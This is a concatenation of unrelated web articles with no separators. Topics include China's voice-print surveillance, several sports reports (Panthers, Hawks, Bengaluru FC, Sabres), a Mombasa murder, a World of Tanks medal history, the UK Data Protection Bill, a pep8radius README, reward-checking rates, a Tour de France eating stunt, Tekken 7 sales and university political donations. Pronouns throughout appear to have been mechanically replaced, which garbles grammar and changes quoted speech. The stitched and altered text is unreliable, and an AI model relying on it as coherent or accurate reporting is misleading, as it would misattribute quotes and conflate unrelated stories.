The technology used by the Chinese government has already collected thousands of audio samples from Chinese citizens. These samples have been input into an automated database created by a Chinese voice recognition and artificial intelligence specialist called iFlytech. While DNA, and fingerprints are still a thing, this audio sampling adds another layer to surveillance capabilities.
When entering China, everyone has to give up a fingerprint. Right now, there are some 40 million fingerprinted people who have been logged within systems in China as well as 1 billion faces that have been scanned. While audio input into the database is relatively new in comparison, the Human Rights Watch estimates that over 70 thousands voices have been catalogued. One instance of mandatory voice sampling took place in Xinjiang, where police set up a system to log citizens who were just trying to get a passport.
China explains that it needs to collect audio samples of citizens in order to root out criminals and people who could violate the law. Chinese reports explain that the necessity lies in the ability to combat fraud, trafficking, kidnapping, blackmail, and other criminal cases.
But at what point will the audio sampling help the government root out criminals who perform less offensive or perhaps morally grey crimes? In the past, China has used the same terminology to combat political protest and free speech, so it's easy to understand why Human Rights groups are concerned about this massive upgrade to the surveillance system already in place.
“Authorities can easily misuse that data in a country with a long history of unchecked surveillance and retaliation against critics,” Sophie Richardson, HRW's China director says.
China has placed extreme security measures in order to save face, like placing cameras outside activist's houses, and they've even jailed numerous government critics who post on social media.

CHARLOTTE, N.C. – The Carolina Panthers have maintained a one-game-at-a-time mentality through a 9-0 start, but cornerback Josh Norman took a brief moment on Thursday to jump ahead to next week's Thanksgiving Day game at Dallas.
Not the game, per se.

The official reveal will come during Thursday night's game between the Jacksonville Jaguars and Tennessee Titans, but Norman has been preparing for a while what cleats to wear with that combination.
“All blue. In Dallas. Thursday night game, right? We might take a hit for that game,'' said Norman, who recently was fined $5,000 for wearing red, white and blue cleats in Carolina's “Salute to Service” game.
“It's going to be big.''
Norman said the new cleats they get from Adidas already are “in the mailbox.'' They didn't reveal what color they would be.
As for the all-blue scheme, Norman can't wait.
“That's going to be fresh. That's going to be nasty,'' they said. “I'm not looking ahead to Dallas by no means or stretch of the imagination. I'm just talking about color schemes.
“That's going to be sick. I know we went all black and all white. But we've never been all blue and it's going to be an honor to get a chance to do that. I'm going to try to make it look sweet and nice.''

As Dwight Howard shook hands and dabbed their way through the Hawks bench before tip-off Thursday, there was a noticeable pep in their step.
“I can't allow anything to steal my joy,” Howard said. “In years past I've allowed certain things to happen, but I'm with a great team, a great organization, the guys have been great, every single one of my teammates I'm very grateful for, and I'm going to give them all of me. It's the only thing I can do.”
When they took the court, that energy remained and the 6'11” center showcased the offensive intensity and defensive prowess that made them one of the NBA's best big men.
Going up against former coach Stan Van Gundy, Howard brought a lively presence to both ends of the floor, similar to when they and Van Gundy were together in Orlando.
“As much as Dwight scored and rebounded, the thing when I had them in Orlando that I thought made us as good as we were, was they were three years in a row the Defensive Player of the Year,” Van Gundy said. “And very deserving. I don't think there was anybody close that affected as many plays in a game as they did.”
Thursday Howard showed glimpses of how they can protect the rim in a way few others in the league can. Not only by blocking shots, but also disrupting countless attempts and forcing opponents to make moves quickly and rush shot attempts.
On offense, they were involved in just about everything that happened. When they aren't posting up, demanding attention, and getting free for putbacks and quick dump offs, they were setting screens and running a pick-and-roll that not only created opportunities for them and the ball handler at the rim, but also left shooters open for three-pointers.
Both Howard and point guard Dennis Schroder said there is room for improvement in their pick-and-roll aspect of the Hawks' offense, but they see it getting better.
“We got to get better for sure,” Schroder said. “We got to get used to it, but I think it's been great the last couple of games and practice.”
But the biggest place where Howard will need to leave their mark going forward this year is on the glass. They pulled down a game-high nine rebounds in 28 minutes of work to go along with 15 points and three blocks.
For a Hawks team that was sixth in points allowed last season, but only 24th in rebounding efficiency, this is where Howard can make the biggest difference.
“Dwight is going to help us immensely on the boards and help our physicality,” coach Mike Budenholzer said.
Howard said it's important the entire team makes a concerted effort to be more aggressive on the boards, but they added that they are looking to lead by example to make sure Atlanta is ready to compete on the glass with anybody come playoff time.
“I know it's my job to be the anchor on defense, rebound, block shots, stuff like that, but all of us got to get in there and battle,” they said.
When Bengaluru FC was formulated back in 2013, a promise was made. A promise which every newly formed team needs to make to the All-India Football Federation. To be added straight into the top-division of Indian football, the JSW (Jindal Steel Works) owned Bengaluru FC promised to not be relegated for three seasons from the league. Job, well done.
Bengaluru FC, in it's debut season, has done what no one before them was capable of achieving, they won the I-League at the first time of asking, in their debut season, in their first few months as a unit.
OutsideoftheBoot.com was invited by the club, to the first press conference that the club held after claiming their maiden I-League title, with head coach Ashley Westwood, captain Sunil Chhetri, CEO Parth Jindal, COO Mustapha Ghouse, Team Manager Mandar Tamhane and assistant coach, Pradhyum Reddy in attendance. We got a little more insight into how this achievement was made and what plans the club has for the future.
As this website is obsessed with tactics, we were quick to find out Ashley Westwood's ideology behind the European style 4-1-3-2 possession based approach as opposed to the pragmatic 4-4-2 ‘hoof-ball' game we have been accustomed to seeing previously in the country. It's a formation clearly concerned with more advance football that Ashley Westwood has experienced with the likes of Blackburn Rovers, Portsmouth etc. When asked what they did differently to what they would in England, Westwood was quick to tell us that the key behind Bengaluru FC's success is that they didn't do anything different to that in England, and that worked in the side's favour. Ashley Westwood had made it clear to the club owners that they wanted to implement an attacking brand of football, common to many teams in England and the lower leagues but largely alien to the Indian sub-continent.
“Before I came here, I had spoken to everyone connected with the club and one of the questions they asked me was what would be the style of play. I had made my mind up that we wanted to be an attacking side. We wanted to be a whole-hearted and committed side, with emphasis on modern fitness and team shape. We didn't come here and say Indian players play this way or the English players play that way. We came in with our system, everyone adapted to that quite quickly and it was just a question of building on the foundation at the club. There is no difference would be my answer to how we'd approach things in England and India and that's the reason we've been so successful. I've not done anything differently to what I was doing at Championship clubs, the lads have responded well and we've all seen the results.”
It was the type of football, essentially, that has seen Bengaluru FC triumph this season. A system which is ‘normal' in more established footballing regions, it was well-advanced for the level of football this part of the country is accustomed to.
Westwood was particularly clear to state how well they've emphasised on the importance of training, working hard on non-matchdays and how well the players have responded to the system.
“I've trained the boys exactly how I would at a Championship club. The training sessions are no different (to the ones in England). It got us a while to get the players up on fitness but with 4-5 weeks under the belt, it was normal. Just like it would be at a Championship club.”
As is common with any football club towards the end of the season, fans are eager to find out what plans the management has for the new season. Without dwelling into too many details, Ashley Westwood stated how the club would be looking for new targets, new players which will be needed to improve the squad. And this is vital as Parth Jindal quickly pointed out how the club has every intention of retaining the I-League title for years to come. Easier said than done, but certainly within the side's capabilities for which improvements are needed.
Sunil Chhetri was asked how potential new players would effect the balance of the team and the “family” they've built already. But again as fans will realise, Chhetri too explained how improvements are always needed and the coach is trusted by the players. As long as they work hard, have a good work-ethic, they will be rewarded.

The management also told the press how they've set out new goals and will face new challenges in the coming season. Retaining the title is probably more difficult than winning it initially. Bengaluru FC came into their first season with a lot of excitement and anticipation but next season they'll be dealing with a lot of pressure which their success has thrown upon them; intriguing to see how the largely young squad deal with it.
The topic of continental obligations came up and we were interested to know what Ashley Westwood's perception of the competition is and how will they deal with the added number of games. The ex-United youngster was honest in their reply as they stated that, understandably, the team will be effected by having to play in another competition, but it's something they're excited to deal with. Both Westwood and Jindal stated that the club was adamant they would try everything in their hands to be the first Indian club to participate in the AFC Champions League, for which they will have to play a rather difficult qualifier.
“Obviously, the extra games will affect us and that's where pre-season and off-season planning comes into play. We know that we are going play in such a competition, so it's up to us to organise ourselves and make sure it doesn't make a big impact. After winning the I-League, the next trophy is the AFC Cup and we'll make sure that it doesn't affect us too much.”
We were also keen to get Sunil Chhetri's idea behind how the training at Bengaluru FC compared to that which they experienced during their stint in Portugal and the United States, and how the professionalism compared as well. The Indian team captain too stated that Bengaluru FC was as professional as any club they had played in, pointing out how the fitness coaches kept the side motivated by making references to European clubs like Manchester City – “Man City players do this in training everyday, why can't you?!”
“As far as professionalism is considered, we are almost there. That is the only reason we are champions today. You know you can talk about a lot of things, but the most important thing is how we train. You can compare the methods here to the best clubs in the world.”
Parth Jindal and Mustapha Ghouse also stated how the club had utilised the services of sports science institute, H.E.A.L, based out of Mumbai, further showing how the club has used modern techniques used in European football in an ever evolving sports industry.
Captain Sunil Chhetri was also quizzed about how the media has criticised them by stating that they only turns up for the national team and has largely been absent at club level, and whether this seasons' performance has put an end to that notion. Chhetri's goal against Dempo in the match that confirmed the title, equaled Baichung Bhutia's goal-scoring record, and they have one more game to surpass it. The captain stated that they hoped that more people make these claims as it only drives them forward, keeps them motivated and that their effort was the same at all levels.
“I wish they still go on, they keep me motivated. Whenever I hear that I don't play for the club like I do for the national team, it makes me more hungry to do well. Hence, I hope the tag doesn't stop today. From the day I started playing football, I haven't bothered much about what people say as at the end of the day, as long as I do what I can to the best of my abilities. It didn't change when I wasn't scoring, it won't change when I'm scoring now. People can continue to talk, it just motivates me to do better.”
Ashley Westwood was also asked about possibly taking over at Manchester United, now that David Moyes has been sacked. “They can't afford me!” was Westwood's prompt reply who a few days back in Goa, after the Dempo win was asked the same question and stated Man United's “telescope doesn't reach this far”.
As has been the topic of discussion among Indian football followers, CEO Parth Jindal was asked about their thoughts on the newly created Indian Super League, which works as competition for the existing I-League. A few stares and looks before Jindal made their stance clear that they wouldn't talk about the ISL as they aren't associated with it. They wished them luck but refused to comment further.
A rather bizarre question was asked by one of the reporters on an unnamed steel magnate from the city who was interested in getting English club Arsenal to the city for a pre-season friendly. Mr Jindal's response of bewilderment was mirrored by most in the room, and us ourselves as they completely denied the rumour and questioned it's authenticity.
Bengaluru FC has also announced their Soccer Schools program, to promote grassroots football in the country, something we wrote about recently. Parth Jindal provided more clarity on the topic.
“We launched BFC soccer schools a week ago and that is another opportunity for us to scout talent. Young players from there will be inducted into our youth academy. Our aim is to look for young talent in Bangalore and there is an abundance of that here. As we speak, a ground is being constructed at Vijaynagar. The academy will be used to train talent not only for players from Bangalore but the entire country. Obviously, the focus will be on Karnataka but it will be a pan-India academy.”
To end the session we got one final question across to the boss. We were informed on Twitter by a Crewe fan how Ashley Westwood is actually a Crewe Alexandra legend, where they have played 125 games. When we asked them whether their time at Crewe was more memorable or the legendary status they have achieved at Bengaluru FC, they were humble in their response and refused to consider themselves to be a legend, insisting it was a team effort and credit should be equally shared. Clearly Ashley has learnt how to handle the media during their time in England.
The club definitely look determined to achieve their goals and are continuing to set the benchmark for the rest to follow both on and off the field. Just merely holding this press conference in front of the established media stations, and this website, is a huge step which most clubs in the past have failed to do so. Promotion is as important as the actual application itself, and Bengaluru FC are paving the way for more success in the coming seasons.

MOMBASA (Reuters) - The bodies of an elderly Swiss couple were found dumped by a country road in Kenya's coastal city of Mombasa with severe injuries on Sunday, police said, and the caretaker of a property where they had been due to stay was being sought for questioning.
Regional police chief Larry Kiyeng identified them by name and said they had flown into Kenya on Saturday and had planned to stay at a private residence in Nyali, an upmarket estate in Mombasa.
“They were expected to arrive by midnight but something happened between the airport and the home. We have found some evidence from a saloon car which was parked at the residence,” Kiyeng, told Reuters, without giving details.
Police were looking for the residence's caretaker who had gone to pick the couple from the airport and who has since disappeared, they said.
The couple, who appeared to be between 60 and 70 years old, were found wrapped in a blanket near a local nightclub on the outskirts of Mombasa, area police chief Christopher Rotich said.
“They have severe injuries. One has deep cuts on the head and it seems they were killed using sharp and blunt objects,” Rotich told Reuters by telephone.
In 2014, Russian and German tourists were robbed and murdered in Mombasa in two separate incidents. Police later shot dead two suspects they said had been behind the murders.
Aleksandr Oskin's destruction of German heavy tanks.
Welcome to Story Behind the Medal where we explore the historical background of the Epic Medals found in World of Tanks. These Epic Medals are based on real-life people and the events that shaped the wars in which they fought. Though challenging to earn in-game, the feats performed by these heroic individuals are truly astounding. Today we're looking at Oskin's Medal.
Oskin's medal requires players to kill three enemy tanks using a tank 2 tiers lower.
In World of Tanks, Oskin's Medal is an Epic Medal that can only be earned in Random Battles. To claim this medal, players must destroy at least three enemy tanks or tank destroyers with a medium tank in one battle. The enemy vehicles must be at least two tiers higher than the player's tank.
The reason behind this two-tier level discrepancy is based on Aleksandr Oskin's incredible achievement during World War II on the outskirts of a Polish village called Oględów. Oskin, a USSR tank commander, was in charge of a T-34 medium tank set on a reconnaissance mission to lead the 6th Armored Corps Guard to patrol Oględów and link up with the unit's 2nd Battalion.
Aleksandr Oskin positioned their tank in a cornfield to avoid the detection of the passing German tanks.
Upon reaching Oględów, Oskin noted that the allied troops were nowhere to be seen; instead, a German platoon was approaching from the other direction. Aleksandr set up a defensive position in a cornfield, camouflaging their T-34 with husks and vegetation to avoid detection.
Unbeknownst to Oskin, the German platoon didn't consist of Panthers, but rather the German's latest creation, the King Tiger heavy tank. Realizing the advantage they had in the cornfield, Oskin waited for the Germans to proceed along the road until their weaker flank was exposed.
Oskin ordered the attack. The shell fired from the T-34 and hit the King Tiger. The blast cleared, but no apparent damage was sustained by the tank. Oskin ordered another shell to be fired, and another. Still, with seemingly no damage, Oskin resorted to sub-calibre ammunition, which resulted in the King Tiger igniting.
Oskin was forced to face three tanks alone, with no help coming anytime soon.
The lead KT, having noticed the attack, began to search for its attacker, but the dust and smoke from its burning ally obscured the view further. Oskin pressed the advantage, shooting round after round into the turret, successfully igniting the lead tank.
With the area occluded by smoke and dust, the third King Tiger began to retreat, and Oskin, seeing the opportunity, pursued their final target. A shot to the rear of the KT resulted in severe engine damage, bringing Aleksandr Oskin's King Tiger kill count to three.
Due to Aleksandr Oskin's heroic actions, they were awarded the Soviet Union's highest honor, the Golden Star, the award given to a Hero of the Soviet Union. While this award is no longer given out, it remains one of the most prestigious awards of World War II and was last awarded in 1991.
Killing heavy tanks in World of Tanks is no small feat, nor is doing so using a medium tank two tiers below. But to be able to achieve this during a major war, with more than just time and effort on the line is a truly incredible achievement.

Have you ever received this medal in World of Tanks?

Plans for new data protection rules in the UK have been confirmed in the Queen's Speech.
They will give young people the right to demand social networks delete any personal data they had shared prior to turning 18.
The Queen said the UK would retain its "world-class" data protection regime.
The proposed Data Protection Bill will reflect plans described in the Conservative Party manifesto ahead of the general election in June.
In a document further detailing its plans, the government said its key priorities were:
ensuring data protection rules were "suitable for the digital age"
"empowering individuals to have more control over their personal data"
giving people the "right to be forgotten" when they no longer wanted a company to process their data - providing there were no legitimate grounds for a company retaining the data
modernising data processing procedures for law enforcement agencies
allowing police and the authorities to "continue to exchange information quickly and easily with international partners" to fight terrorism and other serious crimes
The government also said it would implement the General Data Protection Regulation - new EU data protection rules due to come into force in 2018.
It said the new UK bill would ensure the country met its obligations while a member of the EU, and would help the UK maintain its "ability to share data with other EU members states and internationally after we leave the EU".
The new bill will replace the Data Protection Act 1998.
Responding to the speech, a spokesperson for the technology industry trade body techUK said: "We support the government's commitment to maintain the UK's world-class protection of people's personal data. This will include implementing the General Data Protection Regulation, the biggest transformation of data protection rules in a generation."
The announcement was also welcomed by Nick Taylor, managing director at business consultancy Accenture Strategy.
"This new data protection law is the news that many companies have been waiting for to accelerate their GDPR programme and make it a concrete part of their business," they said.
"Companies now have certainty that they will have to comply with tougher rules, and this gives them the incentive, and need to get their GDPR programme right."
pep8radius PEP8 clean only the parts of the files touched since the last commit, a previous commit or branch. Fixing the entire project of PEP8 infractions (“PEP8 storms”) can lead to merge conflicts, add noise to merges / pull requests and break (git) blame. pep8radius solves this problem by fixing only those PEP8 infractions incontained on the lines of the project which you've been working, leaving these sections “better than you found it” whilst keeping your commits focused on the areas of the codebase you were actually working on.
Installation From pip: $ pip install pep8radius
Usage Move to project directory
Make some changes to the project
Run pep8radius --diff # view a diff of proposed fixed
Run pep8radius --in-place # apply the fixes
Commit your changes Against a branch you can use the same syntax as with git diff: $ pep8radius master # branch name to compare against (compares against merge-base) $ pep8radius c12166f # commit hash $ pep8radius master --in-place # these work with other options too You can also fix docstrings (PEP257) using the docformatter option: $ pep8radius --docformatter --diff Note: can also use ``btyfi`` alias for ``pep8radius``. It can be nice to pipe the diff to cdiff (which makes diffs pretty and has lots of options): $ pep8radius --diff --no-color | cdiff $ pep8radius --diff --no-color | cdiff --side-by-side You can get strange results if you don't use no-color. I actually use the following git alias (which allows git rad and git rad -i ): [ alias ] rad = !pep8radius master --diff --no-color $@ | cdiff --side-by-side
Requirements pep8radius uses autopep8, and in turn pep8. The docformatter option, to fix docstrings, uses docformatter.

High-yield reward checking rates are now at 5-year highs based on our analysis of accounts from 1,023 banks and credit unions. Refer to the bottom of this page to learn more about these high-yield checking accounts and the 5-year highs.
Include credit unions with membership based on any industries that you or immediate family members currently or have previously worked in:
Reward Checking Rate History – Average APY (%) Rate Trend over Time
High-Yield Reward Checking Rates Are at 5-Year Highs
As shown in the above chart, the average yield of reward checking accounts today is well above the level seen five years ago. Today's average reward checking yield is based on reward checking accounts from 1,023 banks and credit unions from around the nation. Most reward checking accounts are offered by community banks and credit unions, but a few are also offered by internet banks.
Overview of High-Yield Reward Checking
Reward checking accounts offer significantly higher rates than traditional checking accounts, and in many cases, they also offer higher rates than internet savings accounts. The average high-yield reward checking account is a free checking account with no monthly service charges. You are rewarded with a high interest rate if you satisfy certain monthly requirements. Most also reward you with ATM fee reimbursements if you use ATMs at other banks. Below are the typical rewards:
High interest rate (2.00% to 4.00%) for balances up to a cap ($15,000 is typical)
Lower interest rate (i.e. 0.25%) for the portion of the balance over the cap
Low base rate if requirements are not met (i.e. 0.05%)
ATM fee refunds up to a certain limit per month
The typical monthly requirements include:
10 to 20 debit card purchases
At least one direct deposit or ACH transaction
Receiving electronic statements
There are sometimes additional requirements such as logging into online banking at least once a month or performing online bill payments.
The two reward checking features that allow banks to offer higher rates are the balance caps and the debit card usage requirements. The balance caps limit how much interest the bank has to pay out, and the debit card usage requirements brings in revenue to the banks from the interchange fees that merchants pay for each debit card purchase.
Comparing Average Yields
As of March 2018, the average reward checking annual percentage yield (APY) is 1.896%. This exceeds the average from five years ago by 13 basis points, and it exceeds the lowest APY recorded (on June 2014) by 25 basis points.
The average yield of reward checking accounts is the highest yield of all deposit products. As of March 2018, the average APYs for several deposit products are shown below along with comparisons to the reward checking APY:
Reward Checking: 1.896%
Standard Checking: 0.148% (175 bps lower)
Savings Accounts: 0.207% (169 bps lower)
Money Market Accounts: 0.234% (166 bps lower)
1-Year CDs: 0.730% (117 bps lower)
5-Year CDs: 1.663% (23 bps lower)
It's important to note that the reward checking yield only applies to a maximum balance (the current average is $16,906) and it only applies when the customer meets the monthly activity requirements.
High-Yield Reward Checking Account Examples
Many reward checking accounts have yields higher than the average. One example is the reward checking account at the South Dakota-based One American Bank. This nationally-available reward checking account is called Kasasa Cash, and it earns 3.50% APY on qualifying balances up to $10,000. Qualifying balances over $10,000 earn 0.25% APY, and non-qualifying balances earn 0.01% APY. There is no monthly service charge.
The monthly requirements include:
At least 12 debit card purchases of at least $5 each
Receive e-statements and other electronic account notices and disclosures
Log into Online Banking at least once
Another example is the reward checking account at the Virginia-based MainStreet Bank. Its nationally-available reward checking account is also called Kasasa Cash. This high-yield checking account earns 3.00% APY on qualifying balances up to $15,000. Qualifying balances over $15,000 earn 0.25% APY, and non-qualifying balances earn 0.05% APY. There is no monthly service charge.
The monthly requirements include:
At least 12 debit card purchases
Receive e-statements
Log into Online Banking at least once
Summary
A high-yield reward checking account may not be a good account option for everyone, but those who maintain balances under $25,000 and who prefer to use debit cards, the reward checking account provides a good alternative to standard checking and internet savings accounts. Most high-yield reward checking accounts are free with no monthly fees even if monthly requirements are not met. That makes them at least equal to standard free checking accounts. When the monthly requirements are met, which can often be easily done when using the account as a primary checking account, the high interest rate can then match or exceed rates of internet savings accounts.
As much as I'd like to experience the Tour de France, I don't enjoy being on a bike for more than 90 minutes or going uphill. So after years of longing as an obsessive fan, I came up with another, more American way to experience the thrill of the Tour.
[+] Enlarge Joel Stein Joel was fired up and ready to go at breakfast time.
I would eat everything the riders do.
After all, as impressive as riding 125 miles up the Pyrenees in five hours is, eating 9,000 calories in a day is far better. And it's a goal that, through training, determination and possibly vomiting, I figured I could attain.
So I called Team Columbia and asked for its menu from one of the hardest days of the 2008 Tour, which included the insane climbs up Col du Tourmalet and Hautacam. Looking at the six meals -- the caloric equivalent of nearly five days of food for a normal adult male -- was the gastronomical equivalent of staring up at a cloud-covered mountain as you approached it (or what I assume it would feel like to stare up at a cloud-covered mountain as you approached it). Apparently these guys needed so many calories that day that Team Columbia's professional nutritionist required them to drink two Coca-Colas. I kept rechecking the list to make sure there were no Twinkies on it.
I soon decided that if I were to be true to myself and my American heritage, I'd have to attempt this feat while sitting on my couch, watching live cycling coverage. It would be all calories in and no calories out -- at least not through sweating. (Unless I was sweating over a toilet bowl.)
Also, in camaraderie with the Tour, which is trying to eliminate performance-enhancing drugs, I vowed not to smoke any marijuana.
Before any record-shattering athletic feat is attempted, it's always best to check with a medical professional. My longtime doctor, Robert Samuelson, gave it some thought and concluded, "It would not hurt you at all" and "You'll gain weight." They also said it wouldn't be much different than eating a couple of Big Macs in a day. Let me just say that while Dr. Samuelson is a great doctor and a smart guy, they clearly know very little about the McDonald's menu. I would have to eat 17 Big Macs to equal the Team Columbia daily caloric intake.
On the morning of my attempt, I woke up extra early just to start eating, which felt rather weird. Unfortunately, it took me almost an hour to prepare breakfast, so I didn't actually start consuming food until about 9 a.m., putting me behind schedule from the start. In front of me, I saw what looked like one of those expensive hotel Sunday brunch buffets that includes breakfast, lunch, dessert and a meal not yet invented.
I enjoyed the fruit, and a half-pound of pasta with olive oil is never a bad thing. But I do not know what the Swiss do all day that requires muesli to be the densest food ever made in non-bar form. The only way I could get through my bowl of it was to revive myself occasionally with little bites of the chocolate croissant.
I felt so full afterward, I broke my own rule and went out for a walk, which turned into a hike. Even Tour riders don't cheat during breakfast.
Before the race starts, there is another meal -- for which I was not yet hungry at all, having eaten an hour ealier. I plowed through the other half of the box of pasta and downed it all with two pitchers of bright pink PowerBar carbo drink, which made me imagine a summer camp for kids who are too skinny. But halfway through I broke down, sweating, with stomach pains. I have no idea how you can eat this much and then feel like getting on a bike. Or how you can eat this much when you're nervous about racing. Or how you can eat this much if you're an adult elephant.
As I watched the race on TV, I alternated between two turkey sandwiches, four peanut butter PowerBars, four PowerBar energy gels and two Cokes. I looked at the riders' grimacing faces and knew I was suffering more. As I sipped my second Coke, my eyes started watering and I desperately wanted to barf. But then, thankfully, the race ended. I was a whole lot of carbo drink, one PowerBar, three gels and a piece of fruit cake behind schedule. Cadel Evans, who'd won the day's race, was smiling and talking on TV, not enduring anything close to what I was. I kept wondering what would happen if those two women on the podium with them tried to kiss me. It could be ugly.
[+] Enlarge Joel Stein Yeah, that meal doesn't look like too much fun.
An hour later, as I sat down for my postrace meal, I'd recovered impressively -- I downed another turkey sandwich, my fourth PowerBar of the day and another Coke. The PowerBar made my jaw ache, but mostly, I was just dealing with the clichéd self-recriminations of an athlete after a loss. I could have dealt with the jaw fatigue and had another PowerBar, but I held off. I vowed to make up for it later that night.
I had to head out to a movie screening in the early evening, but I took my predinner snacks with me. I was gnawing on a giant piece of fruit cake 30 minutes into the film when, suddenly, my face turned red and I felt feverish, as if that last little bit of food had activated all the other food still inside me. I made it about 10 feet out of the theater before I saw that I was following none other than Larry King into the men's room. And I immediately felt very, very bad for him.
I'll spare you the gory details on that portion of the evening. Suffice it to say I went to the bathroom six times that day. I'm not a scientist, and this was not a real experiment, but I learned at least one thing from all of this: You give the human body enough calories in a short enough period of time, and it doesn't have time to turn it all into fat. One way or another, those calories get turned to waste.
I also learned I'm an idiot who does idiotic things.
At 11 p.m., with just an hour to go, I stared at the uncooked chicken breast, vegetables, fruit, yogurt, chocolate and (unbelievably) more pasta I had left to tackle -- and I dropped out. I fell short by more than 2,000 calories. And I marveled, more than ever, about how different I am from professional athletes.
I guess I will never know what it's like, on any level, to be a Tour de France rider. Which fills me with the kind of shame only known by people who fail in an attempt to do something stupid that no one cares about.
The shame of Robbie Knievel.

BUFFALO – Over their 15 NHL seasons, Sabres captain Brian Gionta has seen plenty of players hit the prestigious 1,000-game mark, one of hockey's toughest milestones.
But one time still stands out vividly.
As a member of the Montreal Canadiens, Gionta's teammate, defenseman Hal Gill, played their 1,000th game early in 2011-12. Apparently, Gionta, then a 32-year-old in their 10th season, thought their friend was ancient.
“At the time, I thought, ‘Holy crap, that guy's old,'” Gionta recalled Sunday inside HarborCenter. “It's coming full circle back on me now.”
Yes, by hockey standards, Gionta is old. Tonight's tilt against the Florida Panthers at KeyBank Center will be their 1,000th NHL appearance.
How old is Gionta? The Greece native made their NHL debut in the New Jersey Devils' 2-1 road win against the Edmonton Oilers on Dec. 30, 2001. That was 5,566 days ago. Gionta's teammate Jack Eichel was only 5 years old then.
“It's one of the biggest accomplishments you can have in the game is be called an old guy,” Sabres coach Dan Bylsma said. “I have similar feelings of guys who played a long time in the league and played a lot of games. You just don't know how it's possible to play that many hockey games.”
Gionta's unlikely career is filled with big accomplishments. The 38-year-old winger won the Stanley Cup with New Jersey in 2003. They have also captained two franchises, scored 48 goals in a season and represented Team USA at the Olympics.
Remember, Gionta, who's listed at 5-foot-7, is one of the NHL the smallest players.
“He was able to do what not very many guys have been able to do with their stature, get in the game and play,” Bylsma said.
Sabres defenseman Josh Gorges said Gionta was probably told growing up they would never make it.
“Not only did they make it, they succeeded beyond expectations,” Gorges said. “If you can't look up to somebody like that, you've got to give your head a shake.”
Gionta earned an opportunity, in part, because former New Jersey general manager Lou Lamoriello drafted them 82nd overall in 1998, after they had just completed the first season in what would become a dynamic four-year NCAA career at Boston College.
“I'm just fortunate some people believed in me back in the day,” Gionta said. “(I'm grateful to) the Devils for giving me a chance to break into the league. I would've never thought it would've lasted this long.”
These days, Gionta is still a durable, productive player. They have played all 75 games this season, compiling 14 goals and 32 points.
“He's still at 38 playing like a young man,” Bylsma said.
But the Sabres, who are struggling to emerge following a long rebuild, wanted Gionta for more than that. They signed them to a three-year contract in 2014 because they could also mentor their young players.
“You want to know how to be a professional, you want to know how to work, you want to know how to does it right?” Bylsma said. “Just look at Brian Gionta, and that's what I hope our young players look at and learn from and take to their own games.”
Those qualities helped the Buffalo chapter of the Professional Hockey Writers' Association nominate Gionta this month for the Masterton Trophy, an annual award that recognizes “perseverance, sportsmanship and dedication to hockey.”
Gionta's ability to evolve has helped them last so long through different eras. They morphed from a checker as youngster into a scorer before settling back into a checking role as a veteran.
“It's finding a way, finding a role on each team you're on,” Gionta said.
Gionta entered the NHL in a much different era. Bylsma said it was a “sludgier game” then. The league wasn't kind to undersized players, even if they possessed skill. It was a big man's game in the early 2000s.
“A lot was different,” Gionta said. “There a lot of clutching and grabbing, no two-line passing. There were a lot of different things to slow you down and make it easier for the bigger guys to grab you.”
Gionta grabbed Gorges' attention when they became teammates with the Canadiens in 2009. Gorges respected Gionta's champion pedigree – they also won a national title as a senior in college – and noticed their professionalism.
“A guy I've looked up to for the last seven, eight years,” Gorges said. “Brian's a very close friend of mine.”
Gionta said: “He's one of my best friends, has been for long time. … He's one of the guys I've really connected with. We've had each other's back for a long time.”
That's why tonight will also be special for Gorges.
“To be out there and part of their 1,000th game, it's a proud moment for me,” Gorges said. “I know it's a proud moment for him. We've talked about it before, and it's an amazing accomplishment. … We're all looking forward to it.”

Tekken 7 is one of the most high-profile fighting games to be released this year, especially since it's the latest entry in the storied Tekken series. It was received favorably by critics, and now we know that it's done pretty well commercially, too.
On Twitter, game director Katsuhiro Harada revealed that Tekken 7 has now passed 2 million in sales on PS4 and Xbox One since it launched in June. Add in the 300,000 copies sold on Steam, and Tekken 7 has moved 2.3 million copies across all platforms.
This indicates strong performance for the game so far; for comparison, Tekken 6 hit around 1.8 million copies sold on consoles in its first seven months on the market.
In other Tekken 7 news, Bandai Namco has more DLC in the works. Fatal Fury character Geese Howard will come to the game this winter. You can check out their announcement trailer here. In addition, in August, the game received a bizarre piece of DLC that features bowling.
Individuals employed by the University of Chicago and its peer institutions have overwhelmingly donated to Democratic candidates in this election cycle. In the general election, people employed by the University have donated $370 to Hillary Clinton for every $1 donated to Donald Trump. During the primaries, Clinton received 212 percent more in donations than Bernie Sanders (A.B. '64) did from University employees. The Maroon compared University employees' donations with employees' donations at seven peer institutions. The University was found to be one of the most pro-Sanders schools in this sample. Virtually all schools had few donations to Trump.
The Federal Election Commission (FEC) collects data on individuals who donate to a political committee. The Maroon looked at FEC data from March 1, roughly when the primary season began, to the present. Individuals were categorized by which university they said they were employed by. Individuals self-identify as affiliating with universities, so this analysis only counts people who reported being employed by academic institutions. The FEC also does not include money given to third-party companies (for example, a shell company used to funnel political donations) that is then donated to political candidates. This analysis does count some super PACs, but only when they are specifically tied to a political candidate. The Maroon chose to look at Columbia, Duke, Harvard, Northwestern, Princeton, Stanford, UChicago, and Yale.
Figure 1 shows the total amount of money that was donated by individuals who said they are employed with each University since March 1, 2015.
Figure 1: Total Money Donated
People who say they are employed by the University have donated less money to political committees than any of the University's peer institutions. People who list their employers as Stanford, Harvard, and Columbia have donated drastically more than the other schools looked at. Stanford tops the list at $1.6 million, roughly 4 times higher than UChicago's $375 thousand.
Figure 2 breaks donations down by individuals at these institutions. The leftmost bar represents the 25th percentile of donors. If a school had 100 donors, this would be how much the 25th least-charitable donor gave. The middle bar represents the amount donated by the median donor. In the same example, this would be how much the 50th least-charitable donor gave. The rightmost bar represents the amount donated by the 75th percentile of donors. Using the same example, this would represent how much the 25th most-charitable individual donated.
Figure 2: Size of Donations
The graph shows that the median amount donated by an individual at these universities is roughly $500 across the schools. The lowest median is at Princeton, where the median donor donated $400, while the highest median is at Stanford, where the median donor gave $528. The 25th percentile of donors is also roughly the same across institutions, with minor differences. This implies that the bottom 50 percent of donors across schools donate roughly the same amount per person. However, there were drastic differences in the 75th percentile. The 75th percentile of donors at Stanford gave twice as much as their counterparts at UChicago. Similarly, the 75th percentile donor was relatively high at Columbia, Harvard, Stanford, and Yale. We can infer that most donors at these schools donate similar amounts, but the top 25 percent of donors at Columbia, Harvard, Stanford, and Yale donate substantially more than the top 25 percent of donors at UChicago do.
Figure 3 shows how many individuals donated at different schools. It displays unique donors; meaning if someone would donate today and tomorrow, that person is still only counted as one donor.
Figure 3: Number of Unique Donors
